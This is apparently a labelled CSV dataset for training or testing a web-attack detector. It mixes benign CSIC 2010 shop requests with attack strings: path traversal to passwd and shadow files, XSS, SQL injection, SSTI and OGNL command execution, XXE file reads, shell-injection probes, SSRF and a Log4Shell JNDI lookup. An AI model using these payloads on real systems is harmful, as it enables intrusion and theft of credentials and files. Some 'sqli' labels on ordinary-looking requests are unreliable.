payload,label,source
"POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=13626049A78EDD9F526951A2A47BF7D7 Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
"POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=88A1356DAFCD8D9403908EB5F3D77772 Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
"<?xml version=""1.0""?><!DOCTYPE lolz [<!secret253 lol ""lol""><!secret253 secret253 ""&lol;&lol;&lol;&lol;"">]><lolz>&secret253;</lolz>",xxe,augmented
"GET http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=A32A28B6C990A8AE08BB1EEE2B541C48 Connection: close",normal,csic_2010
modo=insertar&precioA=943&B1=Confirmar,sqli,csic_2010
"GET http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=2569CD641B6001F2F3E9AFB358AFC151 Connection: close",normal,csic_2010
%c0%5e%c0%5e0x5cetc0x5cpasswd,path_traversal,payloads_all_the_things
/etc/X11/xkb/symbols/pc/hu,path_traversal,seclists
<scr<script>ipt>alert(1)</scr</script>ipt>,xss,seclists
"GET http://localhost:8080/tienda1/publico/autenticar.jsp/6909030637832563290.jsp.java HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=318AA170BA712791614A4293771B5277 Connection: close",sqli,csic_2010
"GET http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=E4CDF1D80D973A40A30F200BF18C8200 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=77DE1C1703C952A2FCFD8ADC72133B69 Connection: close",normal,csic_2010
C:\Users\All Users\AppData\Local\Microsoft\OneDrive\logs\Personal\install-peruser_2020-09-17_040954_5080-2576.loggz,path_traversal,seclists
"GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=5332129575176670D881FE019B13EABB Connection: close",normal,csic_2010
..%01%c0%qf..%01%c0%qfwindows%c0%qfsystem32%c0%qfdrivers%c0%qfetc%c0%qfhosts,path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=6668C8705780712C9728B775C473F690 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=CEC1BB61E61E12198823B1A7A6756A36 Connection: close",normal,csic_2010
(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL),sqli,seclists
%5C..%%32%%66%5C..%%32%%66%5C..%%32%%66%5C..%%32%%66%5C..%%32%%66%5C..%%32%%66windows%%32%%66system32%%32%%66drivers%%32%%66etc%%32%%66hosts,path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=5037B3897ACCA3DC5D564ACC51765E54 Connection: close",normal,csic_2010
%2e.%c0%afboot.ini,path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=4C9CBBC98D8215BD1BC3C2D4EBBD327B Connection: close",normal,csic_2010
/var/log/ncftpd.errs,path_traversal,seclists
"GET http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=A7F399D9DD46CC215B52BDF449C7404F Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=D94D9003DC62E0BC1B1307346200B54F Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=707D43ED75E309567E575D5008EA8906 Connection: close",normal,csic_2010
%3B%20str%3D%24%28echo%20NMEESI%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2522,command_injection,seclists
modo=insertar&precio=2545&B1=Pasar+por+caja%2F,sqli,csic_2010
{{_self.env.registerUndefinedFilterCallback('ls /')}}{{_self.env.getFilter('t')}},ssti,augmented
/etc/logrotate.d/apache2,path_traversal,seclists
"GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=steinar&password=c4e32788ia&nombre=Maximiliano&apellidos=Andr%E9s+Castanyer&email=sazarina_logue%40gay-tantra.lc&dni=81881966B&direccion=Calle+Udal+Hilerria%2C+11%2C+11%3FD&ciudad=Cortegada&cp=45256&provincia=Lugo&ntc=9859982019470735&B1=Registrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=8AF5EF4853CDD779C6D7C75DE26C11FA Connection: close",normal,csic_2010
{{_self.env.registerUndefinedFilterCallback('cat /etc/passwd')}}{{_self.env.getFilter('q')}},ssti,augmented
src=dict://127.1/,ssrf,augmented
"POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=ABDC098F1E65C7AFE9ECE212B526D35F Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
"GET http://localhost:8080/IISSamples/sdk/asp/database/StoredProcedures_VBScript.asp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=7ACE3185B54202D98230EDC8D2C5E793 Connection: close",sqli,csic_2010
"GET http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=96C53AD2A0683309302AD73EFF95906C Connection: close",normal,csic_2010
%2522%3B%20str%3D%24%28echo%20RNIVNR%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%203%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20//,command_injection,seclists
"<Input value = ""XSS"" type = text>",xss,seclists
"GET http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=FE249409C89B766A41DB01215FDA2CBD Connection: close",normal,csic_2010
%%32%%65%%32%%65%c1%9c%%32%%65%%32%%65%c1%9cetc%c1%9cissue,path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=013FBABEA25E2263E7933C111BC0D288 Connection: close",normal,csic_2010
/..../..../..../..../..../..../..../..../{FILE},path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=9D7C3F1AA7EDC43DE57DB3D8F37D3780 Connection: close",normal,csic_2010
/var/www/html/squirrelmail-1.2.9/config/config.php,path_traversal,seclists
"POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=695BA9DA1CD2BC666D28D97D965C388D Content-Type: application/x-www-form-urlencoded Connection: close",sqli,csic_2010
"<tt onmouseup=""alert(1)"">test</tt>",xss,seclists
"<?xml version=""1.0""?><!DOCTYPE data [<!data945 data945 SYSTEM ""expect://id"">]><data>&data945;</data>",xxe,augmented
modo=entrar&login=atoui&pwd=atAjadA&remember=on&B1=Entrar,sqli,csic_2010
%22%26%20sleep%200%20%26%26%20str%3D%24%28echo%20AIVPGH%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%205%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%22,command_injection,seclists
../../../../../usr/local/cpanel/logs/access_log%00,path_traversal,seclists
"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=BAFF3B6AF81F42D52E2A0C2B9998F233 Connection: close",normal,csic_2010
.?%c1%1c.?%c1%1c.?%c1%1cwindows%c1%1csystem32%c1%1cdrivers%c1%1cetc%c1%1chosts,path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=3114835932D8585ADD61A16288DF08EB Connection: close",normal,csic_2010
"(new String(@java.lang.Runtime@getRuntime().exec(""id"").getInputStream().readAllBytes()))/0",ssti,payloads_all_the_things
C:\Program Files\IceWarp\html\webmail\basic\language\cs\lang.xml,path_traversal,seclists
"<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE foo [<!evil959 evil959 SYSTEM ""file:///proc/self/environ"">]><foo>&evil959;</foo>",xxe,augmented
"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9755&B1=Pasar+por+caja HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=029F152A2431001373B4BF8967923A1B Connection: close",normal,csic_2010
<svg><caption onload=alert(1)></caption>,xss,seclists
"';echo%20PYWYEX$((88%2B85))$(echo%20PYWYEX)PYWYEX""",command_injection,seclists
"GET http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=04832D278BFA7F0043797F494451818E Connection: close",normal,csic_2010
modo=insertar&precio=1750&B1=Pasar+por+caja,normal,csic_2010
"GET http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=C5D345C6D888BAA1F40C2AE7A14EA30C Connection: close",normal,csic_2010
%2e.%c0%qf%2e.%c0%qf%2e.%c0%qfetc%c0%qfissue,path_traversal,payloads_all_the_things
/etc/remstats/config-base/rrds/newslog,path_traversal,seclists
ldap://2130706433/health,ssrf,augmented
%25c0%25ae%25c0%25ae%5c%25c0%25ae%25c0%25ae%5cetc%5cissue,path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=FF35CD0F9A06EC54DC7881FA3F94B002 Connection: close",normal,csic_2010
/etc/cron.d/mcelog,path_traversal,seclists
/etc/X11/olwm/openwin-menu,path_traversal,seclists
"<?xml version=""1.0""?><!DOCTYPE test [<!evil849 evil849 SYSTEM ""file:////etc/shadow%00"">]><test>&evil849;</test>",xxe,augmented
Accept-Language: ${jndi:ldap://oast.me:389/payload},log4shell,augmented
"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=37&B1=A%F1adir+al+carrito HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=ECC154D36CF546ED0A44F29A96F1109D Connection: close",normal,csic_2010
"GET http://localhost:8080/CFIDE/administrator/checkfile.cfm HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=DBC0F5D7DEBC816E1034441C888285E3 Connection: close",sqli,csic_2010
...\...\...\...\...\...\etc\passwd,path_traversal,payloads_all_the_things
%5C..%%35%%63%5C..%%35%%63etc%%35%%63passwd,path_traversal,payloads_all_the_things
